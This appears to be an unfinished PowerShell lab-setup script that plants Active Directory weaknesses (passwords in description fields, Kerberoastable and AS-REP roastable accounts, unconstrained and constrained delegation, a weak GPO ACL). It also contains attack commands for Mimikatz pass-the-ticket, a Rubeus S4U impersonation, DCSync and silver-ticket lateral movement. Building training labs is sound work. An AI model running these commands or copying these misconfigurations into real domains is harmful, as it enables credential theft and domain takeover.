Import-Module ActiveDirectory

### Vulnerabilities

### Overview
# 1. Sensitive Data in LDAP
# 2. Password Spraying
# 3. Kerberoasting
# 4. ASREP Roasting
# 5. PASSWD NOT REQ
# 6. GPPPassword
# 7. Unconstrained Delegation
# 8. Constrained Delegation
# 9. Silver Tickets
#10. ACLs/ACEs
#11. GPO Abuse
#12. Golden Ticket, DCSync, Skeleton, ...
#13. Forest Trust Abuse
#14. Bastion


###########################################################################
### 1. Sensitive Data in LDAP - Infos in description field
###########################################################################
Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Adding Users with sensitive data in Attributes..."
if (!([ADSI]::Exists("LDAP://CN=PrinterAdmin,OU=ServiceAccounts,OU=AdministrativeAccounts,DC=contoso,DC=azure")))
{
	
	New-ADUser -Name "PrinterAdmin" -DisplayName "PrinterAdmin" -SamAccountName "printeradm" -description "Weird behavior on 9th of October... PW reset to x!3945jjlkJ2mN4QQ2" -UserPrincipalName "printeradm" -GivenName "Printer" -Surname "Administrator" -AccountPassword ((ConvertTo-SecureString "x!3945jjlkJ2mN4QQ2" -AsPlainText -Force)) -Enabled $true -Path "OU=ServiceAccounts, OU=AdministrativeAccounts, DC=CONTOSO, DC=AZURE" -ChangePasswordAtLogon $false -PasswordNeverExpires $true
	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Created user PrinterAdmin with sensitive data in User Attributes" 
}else
{
	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) The user PrinterAdmin already exists. Moving On."
}

###########################################################################
### 2. Password Spraying - User has domain standard password set
###########################################################################
Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Adding Users with start password of the domain"
if (!([ADSI]::Exists("LDAP://CN=NewAdmin,OU=ServiceAccounts,OU=AdministrativeAccounts,DC=contoso,DC=azure")))
{
	New-ADUser -Name "NewAdmin" -DisplayName "NewAdmin" -SamAccountName "newadm" -UserPrincipalName "newadm" -GivenName "Horst" -Surname "Administrator" -AccountPassword ((ConvertTo-SecureString "Start123!" -AsPlainText -Force)) -Enabled $true -Path "OU=ServiceAccounts, OU=AdministrativeAccounts, DC=CONTOSO, DC=AZURE" -ChangePasswordAtLogon $false -PasswordNeverExpires $true
	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Created user newadm with start password of the domain" 
}else
{
	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) The user NewAdmin already exists. Moving On."
}
###########################################################################
### 3. Kerberoasting - Kerberoastable Users
###########################################################################
Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Adding Kerberoastable Users..."
if (!([ADSI]::Exists("LDAP://CN=DBAdmin,OU=ServiceAccounts,OU=AdministrativeAccounts,DC=contoso,DC=azure")))
{
	
	New-ADUser -Name "DBAdmin" -DisplayName "DBAdmin" -SamAccountName "dbadm" -description "DatabaseAdministrationAccount" -UserPrincipalName "dbadm" -GivenName "Database" -Surname "Administrator" -AccountPassword ((ConvertTo-SecureString "kd329Sl23kcJk3A$" -AsPlainText -Force)) -Enabled $true -Path "OU=ServiceAccounts, OU=AdministrativeAccounts, DC=CONTOSO, DC=AZURE" -ChangePasswordAtLogon $false -PasswordNeverExpires $true
	setspn -s http/wef.contoso.azure:1433 contoso.azure\dbadm
	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Created user Kerberoastable User DBAdmin..." 
}else
{
	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) The user DBAdmin already exists. Moving On."
}

if (!([ADSI]::Exists("LDAP://CN=WebAdmin,OU=ServiceAccounts,OU=AdministrativeAccounts,DC=contoso,DC=azure")))
{
	
	New-ADUser -Name "WebAdmin" -DisplayName "WebAdmin" -SamAccountName "webadm" -description "WebAdministrationAccount" -UserPrincipalName "webadm" -GivenName "Web" -Surname "Administrator" -AccountPassword ((ConvertTo-SecureString "Web1234!200" -AsPlainText -Force)) -Enabled $true -Path "OU=ServiceAccounts, OU=AdministrativeAccounts, DC=CONTOSO, DC=AZURE" -ChangePasswordAtLogon $false -PasswordNeverExpires $true
	setspn -s http/wef.contoso.azure:8080 contoso.azure\webadm
	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Created user Kerberoastable User WebAdmin..." 
}else
{
	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) The user WebAdmin already exists. Moving On."
} 

if (!([ADSI]::Exists("LDAP://CN=IAMadmin,OU=ServiceAccounts,OU=AdministrativeAccounts,DC=contoso,DC=azure")))
{
	
	New-ADUser -Name "IAMAdmin" -DisplayName "IAMAdmin" -SamAccountName "iamadm" -description "IAMAdministrationAccount" -UserPrincipalName "iamadm" -GivenName "IAM" -Surname "Administrator" -AccountPassword ((ConvertTo-SecureString "k3jdfiu2KAn3!" -AsPlainText -Force)) -Enabled $true -Path "OU=ServiceAccounts, OU=AdministrativeAccounts, DC=CONTOSO, DC=AZURE" -ChangePasswordAtLogon $false -PasswordNeverExpires $true
	setspn -s http/wef.contoso.azure:445 contoso.azure\iamadm
	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Created user Kerberoastable User IAMAdmin..." 
}else
{
  Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) The user IAMAdmin already exists. Moving On."
} 

if (!([ADSI]::Exists("LDAP://CN=SoundAdmin,OU=ServiceAccounts,OU=AdministrativeAccounts,DC=contoso,DC=azure")))
{
	
	
	New-ADUser -Name "SoundAdmin" -DisplayName "SoundAdmin" -SamAccountName "soundadm" -description "SoundAdministrationAccount" -UserPrincipalName "soundadm" -GivenName "Sound" -Surname "Administrator" -AccountPassword ((ConvertTo-SecureString "k2k3kkksllaKLs!$" -AsPlainText -Force)) -Enabled $true -Path "OU=ServiceAccounts, OU=AdministrativeAccounts, DC=CONTOSO, DC=AZURE" -ChangePasswordAtLogon $false -PasswordNeverExpires $true
	setspn -s http/wef.contoso.azure:1337 contoso.azure\soundadm
	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Created user Kerberoastable User SoundAdmin..." 
}else
{
  Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) The user SoundAdmin already exists. Moving On."
}

if (!([ADSI]::Exists("LDAP://CN=MercureAdmin,OU=ServiceAccounts,OU=AdministrativeAccounts,DC=contoso,DC=azure")))
{
	
	
	New-ADUser -Name "MercureAdmin" -DisplayName "MercureAdmin" -SamAccountName "mercureadm" -description "MercureAdministrationAccount" -UserPrincipalName "mercureadm" -GivenName "Mercure" -Surname "Administrator" -AccountPassword ((ConvertTo-SecureString "Mercure2020!" -AsPlainText -Force)) -Enabled $true -Path "OU=ServiceAccounts, OU=AdministrativeAccounts, DC=CONTOSO, DC=AZURE" -ChangePasswordAtLogon $false -PasswordNeverExpires $true
	setspn -s http/wef.contoso.azure:443 contoso.azure\mercureadm
	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Created user Kerberoastable User MercureAdmin..." 
	
}else
{
  Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) The user MercureAdmin already exists. Moving On."
}

###########################################################################
#### 4. ASREP Roasting - ASREP Roastable Users
###########################################################################
Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Adding ASREP Roastable Users..."
if (!([ADSI]::Exists("LDAP://CN=TankAdmin,OU=ServiceAccounts,OU=AdministrativeAccounts,DC=contoso,DC=azure")))
{
	
	New-ADUser -Name "TankAdmin" -DisplayName "TankAdmin" -SamAccountName "tankadm" -description "TankAdministrationAccount" -UserPrincipalName "tankadm" -GivenName "Tank" -Surname "Administrator" -AccountPassword ((ConvertTo-SecureString "Peaceful2020!" -AsPlainText -Force)) -Enabled $true -Path "OU=ServiceAccounts, OU=AdministrativeAccounts, DC=CONTOSO, DC=AZURE" -ChangePasswordAtLogon $false -PasswordNeverExpires $true
	Get-ADUser tankadm | Set-ADAccountControl -DoesNotRequirePreAuth $true
	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Created user ASREP Roastable User TankAdmin..." 
}else
{
  Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) The user TankAdmin already exists. Moving On."
}

###########################################################################
### 5. PASSWD NOT REQ User - Login without password
###########################################################################
Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Adding PASSWD_NOT_REQD User..."
if (!([ADSI]::Exists("LDAP://CN=MailerAdmin,OU=ServiceAccounts,OU=AdministrativeAccounts,DC=contoso,DC=azure")))
{
	New-ADUser -Name "MailerAdmin" -DisplayName "MailerAdmin" -SamAccountName "maileradm" -description "MailerAdministrationAccount" -UserPrincipalName "maileradm" -GivenName "Mailer" -Surname "Administrator" -Enabled $true -Path "OU=ServiceAccounts, OU=AdministrativeAccounts, DC=CONTOSO, DC=AZURE" -ChangePasswordAtLogon $false -PasswordNeverExpires $true -PasswordNotRequired $true
	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Created PASSWD NOT REQ User MailerAdmin..." 
}else
{
  Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) The user MailerAdmin already exists. Moving On."
}

###########################################################################
### 6. GPPPassword
###########################################################################
# Infos: howto:Setting local user passwords via Group Policy
# https://attack.stealthbits.com/plaintext-passwords-sysvol-group-policy-preferences


###########################################################################
### 7. Unconstrained Delegation
###########################################################################
# Infos: Setup a VM with (un)constrained delegation, show benefits like e.g. lateral movement, show problems by using token, 
# Need: action where admin user logs into the system
# https://4sysops.com/archives/how-to-configure-computer-delegation-with-powershell/


Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Adding LocalAdmin User for AdminPC1"
if (!([ADSI]::Exists("LDAP://CN=LocalAdminPC1,OU=LocalAdminAccounts,OU=AdministrativeAccounts,DC=contoso,DC=azure")))
{
	New-ADUser -Name "LocalAdminPC1" -DisplayName "LocalAdminPC1" -SamAccountName "localadminpc1" -UserPrincipalName "localadminpc1" -GivenName "localadminpc1" -Surname "Administrator" -AccountPassword ((ConvertTo-SecureString "TestPassword123!" -AsPlainText -Force)) -Enabled $true -Path "OU=LocalAdminAccounts, OU=AdministrativeAccounts, DC=CONTOSO, DC=AZURE" -ChangePasswordAtLogon $false -PasswordNeverExpires $true
	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Created user LocalAdminPC1" 
}else
{
	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) The user LocalAdminPC1 already exists. Moving On."
}

Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Adding LocalAdmin User for AdminPC2"
if (!([ADSI]::Exists("LDAP://CN=LocalAdminPC2,OU=LocalAdminAccounts,OU=AdministrativeAccounts,DC=contoso,DC=azure")))
{
	New-ADUser -Name "LocalAdminPC2" -DisplayName "LocalAdminPC2" -SamAccountName "localadminpc2" -UserPrincipalName "localadminpc2" -GivenName "localadminpc2" -Surname "Administrator" -AccountPassword ((ConvertTo-SecureString "TestPassword123!" -AsPlainText -Force)) -Enabled $true -Path "OU=LocalAdminAccounts, OU=AdministrativeAccounts, DC=CONTOSO, DC=AZURE" -ChangePasswordAtLogon $false -PasswordNeverExpires $true
	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Created user LocalAdminPC2" 
}else
{
	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) The user LocalAdminPC2 already exists. Moving On."
}

Invoke-Command -ScriptBlock{net localgroup "Remote Desktop Users" /add CONTOSO\localadminpc1} -computername AdminPc.contoso.azure
Invoke-Command -ScriptBlock{net localgroup "Administrators" /add CONTOSO\localadminpc1} -computername AdminPc.contoso.azure

Invoke-Command -ScriptBlock{net localgroup "Remote Desktop Users" /add CONTOSO\localadminpc2} -computername AdminPc.contoso.azure
Invoke-Command -ScriptBlock{net localgroup "Administrators" /add CONTOSO\localadminpc2} -computername AdminPc.contoso.azure

Invoke-Command -ScriptBlock{net localgroup "Remote Desktop Users" /add CONTOSO\localadminpc2} -computername AdminPc2.contoso.azure
Invoke-Command -ScriptBlock{net localgroup "Administrators" /add CONTOSO\localadminpc2} -computername AdminPc2.contoso.azure

Get-ADComputer -Identity AdminPc | Set-ADAccountControl -TrustedForDelegation $True
Get-ADComputer adminpc -Properties * | Format-List -Property *delegat*,msDS-AllowedToActOnBehalfOfOtherIdentity

$SecPassword = ConvertTo-SecureString 'TestPassword123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('CONTOSO\localadminpc2', $SecPassword)
$s = New-PSSession -ComputerName AdminPc -Credential $Cred
Invoke-Command –Session $s -ScriptBlock {whoami; hostname}

# Connect to server and run mimikatz
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
* File: 'C:\Users\appadmin\Documents\user1\[0;6f5638a]-2-0-60a10000Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi': OK 

# Load Domain Admin ticket (TGT)
Invoke-Mimikatz -Command '"kerberos::ptt [0;48b991]-2-0-60a10000-localadminpc2@krbtgt-CONTOSO.AZURE.kirbi"' 

# Run commands
Invoke-Command -ScriptBlock{whoami;hostname} -computername adminpc2



###########################################################################
### 8. Constrained Delegation
###########################################################################
# Infos: Setup a VM with (un)constrained delegation, 
# Need: action where admin user logs into the system, change service type due to unprotected field
# https://4sysops.com/archives/how-to-configure-computer-delegation-with-powershell/

#TOOOODOOOOO

Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Adding Users with constrained delegation of service time"
if (!([ADSI]::Exists("LDAP://CN=TimeAdmin,OU=ServiceAccounts,OU=AdministrativeAccounts,DC=contoso,DC=azure")))
{
	
	New-ADUser -Name "TimeAdmin" -DisplayName "TimeAdmin" -SamAccountName "timeadm" -UserPrincipalName "timeadm" -GivenName "Time" -Surname "Administrator" -AccountPassword ((ConvertTo-SecureString "x!3dsfds945jjlkJ2mN4QQ2" -AsPlainText -Force)) -Enabled $true -Path "OU=ServiceAccounts, OU=AdministrativeAccounts, DC=CONTOSO, DC=AZURE" -ChangePasswordAtLogon $false -PasswordNeverExpires $true
	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Created user TimeAdmin with constrained delegation of service time" 
}else
{
	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) The user TimeAdmin already exists. Moving On."
}

Set-ADUser -Identity timeadm -Add @{'msDS-AllowedToDelegateTo'=@('TIME/AdminPc2.Contoso.Azure')}
Invoke-Command -ScriptBlock{net localgroup "Remote Desktop Users" /add CONTOSO\timeadm} -computername AdminPc.contoso.azure
Invoke-Command -ScriptBlock{net localgroup "Administrators" /add CONTOSO\timeadm} -computername AdminPc.contoso.azure

$SecPassword = ConvertTo-SecureString 'x!3dsfds945jjlkJ2mN4QQ2' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('CONTOSO\timeadm', $SecPassword)
$s = New-PSSession -ComputerName AdminPc -Credential $Cred
Invoke-Command –Session $s -ScriptBlock {whoami; hostname}

$Password = "x!3dsfds945jjlkJ2mN4QQ2"
$Hash = Get-MD4Hash -DataToHash $([Text.Encoding]::Unicode.GetBytes($Password))
Write-Output "Hash being used: $Hash"








# Enum User accounts with constrained delegation
Get-NetUser -TrustedToAuth

# find any users/computers with constrained delegation st (PowerView-Dev)
Get-DomainUser -TrustedToAuth | Format-Table cn, samaccountname, msds-allowedtodelegateto

# Compromise the user account and request a Ticket
.\Rubeus.exe s4u /user:dbservice /rc4:6f9e22a64970f32bd0d86fddadc8b8b5 /impersonateuser:administrator /msdsspn:"TIME/UFC-DC1.US.FUNCORP.LOCAL" /altservice:cifs /ptt

# Access the DC
ls \\ufc-dc1.us.funcorp.local\c$

Invoke-Command -Computer adminpc2 -ScriptBlock {whoami; hostname}
Get-ADComputer adminpc2 -Properties servicePrincipalName | Select-Object ‑ExpandProperty servicePrincipalName


###########################################################################
### 9. Silver Tickets
###########################################################################
# Infos: login to host and fetch vm hash and use all silver tickets possibilities

# To DO Create all silver ticket and show all examples

Interesting services to target with a silver ticket :

| Service Type                                | Service Silver Tickets | Attack |
|---------------------------------------------|------------------------|--------|
| WMI                                         | HOST + RPCSS           | `wmic.exe /authority:"kerberos:DOMAIN\DC01" /node:"DC01" process call create "cmd /c evil.exe"`     |
| PowerShell Remoting                         | HTTP + wsman           | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC` |
| WinRM                                       | HTTP + wsman           | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC` |
| Scheduled Tasks                             | HOST                   | `schtasks /create /s dc01 /SC WEEKLY /RU "NT Authority\System" /IN "SCOM Agent Health Check" /IR "C:/shell.ps1"` |
| Windows File Share (CIFS)                   | CIFS                   | `dir \\dc01\c$` |
| LDAP operations including Mimikatz DCSync   | LDAP                   | `lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt` |
| Windows Remote Server Administration Tools  | RPCSS   + LDAP  + CIFS | /      |



###########################################################################
### 10. ACLs/ACEs
###########################################################################
# Infos: misuse rights
# https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
# ForceChangePassword|AddMembers|GenericAll|GenericWrite|AllExtendedRights|Owns|WriteDacl|WriteOwner|ReadLAPSPassword|ReadGMSAPassword

GenericAll - full rights to the object (add users to a group or reset user's password)
GenericWrite - update object's attributes (i.e logon script)
WriteOwner - change object owner to attacker controlled user take over the object
WriteDACL - modify object's ACEs and give attacker full control right over the object
AllExtendedRights - ability to add user to a group or reset password
ForceChangePassword - ability to change user's password
Self (Self-Membership) - ability to add yourself to a group

Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}



###########################################################################
### 11. GPO Abuse
###########################################################################
# Infos: tbd

Import-Module ActiveDirectory

### Weak GPO
Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Adding Weak GPO..."
New-GPO -Name "ScreenSaverTimeOut" -Comment "Sets the time to 900 seconds"
Set-GPRegistryValue -Name "ScreenSaverTimeOut" -Key "HKCU\Software\Policies\Microsoft\Windows\Control Panel\Desktop" -ValueName ScreenSaveTimeOut -Type String -Value 900
New-GPLink -Name "ScreenSaverTimeOut" -Target "ou=Workstations,dc=windomain,dc=local"

$gpoguid = Get-GPO "ScreenSaverTimeOut" | select -expand id
$gpoguid= $gpoguid.ToString()
$acl = Get-Acl "\\windomain.local\SYSVOL\windomain.local\Policies\{$gpoguid}"
$AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("windomain.local\Sales","FullControl","Allow")
$acl.SetAccessRule($AccessRule)
$acl | Set-Acl "\\windomain.local\SYSVOL\windomain.local\Policies\{$gpoguid}"

###########################################################################
### 12. Golden Ticket, DCSync, Skeleton, ...
###########################################################################
# Get DC hash and show attacks

###########################################################################
### 13. Forest Trust Abuse
###########################################################################
# Infos: tbd

###########################################################################
### 14. Bastion
###########################################################################
# Infos: tbd
